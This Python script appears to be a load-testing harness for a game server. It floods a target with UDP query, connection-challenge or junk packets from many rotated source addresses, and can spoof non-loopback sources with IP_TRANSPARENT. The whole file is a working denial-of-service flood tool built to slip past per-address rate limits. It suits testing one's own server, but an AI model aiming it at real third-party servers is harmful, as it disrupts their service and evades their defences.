#!/usr/bin/env python3
"""Floods a server with connectionless packets, like a query or connection flood
on a public server.

usage: flood.py --server 127.0.0.1:27015 --kind a2s --pps 50000 --sources 1024
                [--source-prefix 127.2] [--start-at <epoch>] [--duration 30]
                [--output flood.json]

Packets come from --sources different addresses (127.2.x.y, any 127.0.0.0/8
address is local on Linux), so that per-address rate limits alone do not stop
the flood. Replies are counted: they show how much of the flood the server
still processes.

The server answers loopback addresses without a challenge, like Steam. To flood
it like from the Internet, with spoofed addresses, give a non-loopback prefix
(--source-prefix 10.99, --server <container address>:27015): the sockets then
bind with IP_TRANSPARENT, which needs root (or CAP_NET_RAW). The server's replies
to these addresses leave the host, so none are counted.

Kinds:
  a2s        A2S_INFO queries ("TSource Engine Query")
  challenge  "getchallenge steam" connection attempts
  junk       random bytes that look like connected-client traffic
"""

import argparse
import json
import os
import random
import resource
import socket
import sys
import time

PAYLOADS = {
    "a2s": b"\xff\xff\xff\xffTSource Engine Query\x00",
    "challenge": b"\xff\xff\xff\xffgetchallenge steam\n",
}


IP_TRANSPARENT = 19


def source_address(prefix, index):
    # Last octet in 1..254, up to 65024 addresses
    return f"{prefix}.{index // 254}.{index % 254 + 1}"


def open_sockets(count, prefix):
    # One socket per source address: raise the open file limit to the hard limit
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    if soft != resource.RLIM_INFINITY and soft < count + 64:
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    sockets = []
    for i in range(count):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if not prefix.startswith("127."):
            # Send from addresses that are not the host's
            s.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)
        s.bind((source_address(prefix, i), 0))
        s.setblocking(False)
        sockets.append(s)
    return sockets


def drain(sockets):
    received = 0
    for s in sockets:
        while True:
            try:
                s.recv(4096)
            except (BlockingIOError, ConnectionRefusedError):
                break
            received += 1
    return received


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--server", default="127.0.0.1:27015")
    parser.add_argument("--kind", choices=["a2s", "challenge", "junk"], default="a2s")
    parser.add_argument("--pps", type=int, default=50000, help="packets per second")
    parser.add_argument("--sources", type=int, default=1024, help="number of source addresses")
    parser.add_argument("--source-prefix", default="127.2", help="first two octets of the source addresses")
    parser.add_argument("--start-at", type=float, default=0.0, help="epoch time to start at")
    parser.add_argument("--duration", type=float, default=30.0)
    parser.add_argument("--output")
    args = parser.parse_args()

    host, port = args.server.rsplit(":", 1)
    target = (host, int(port))
    sockets = open_sockets(args.sources, args.source_prefix)

    if args.kind == "junk":
        payloads = [os.urandom(random.randint(16, 64)) for _ in range(256)]
        # Never 0xFFFFFFFF (connectionless) nor 0xFFFFFFFE (split)
        payloads = [b"\x01" + p[1:] for p in payloads]
    else:
        payloads = [PAYLOADS[args.kind]]

    if args.start_at:
        time.sleep(max(0.0, args.start_at - time.time()))

    # Send in slots of about 1 ms
    per_slot = max(1, args.pps // 1000)
    slot = per_slot / args.pps
    sent = 0
    replies = 0
    errors = 0
    start = time.monotonic()
    end = start + args.duration
    next_slot = start
    index = 0
    n_sockets = len(sockets)
    n_payloads = len(payloads)
    last_drain = start

    while True:
        now = time.monotonic()
        if now >= end:
            break
        if now < next_slot:
            time.sleep(next_slot - now)
            continue
        next_slot += slot
        # Do not try to catch up after a stall: keep the rate, not the count
        if next_slot < now - 0.05:
            next_slot = now

        for _ in range(per_slot):
            try:
                sockets[index % n_sockets].sendto(payloads[index % n_payloads], target)
                sent += 1
            except OSError:
                errors += 1
            index += 1

        if now - last_drain > 0.05:
            replies += drain(sockets)
            last_drain = now

    elapsed = time.monotonic() - start
    time.sleep(0.2)
    replies += drain(sockets)

    result = {
        "kind": args.kind,
        "sources": args.sources,
        "target_pps": args.pps,
        "sent": sent,
        "sent_pps": sent / elapsed if elapsed else 0.0,
        "replies": replies,
        "send_errors": errors,
    }
    text = json.dumps(result, indent=2)
    if args.output:
        with open(args.output, "w") as f:
            f.write(text + "\n")
    print(text)


if __name__ == "__main__":
    sys.exit(main())
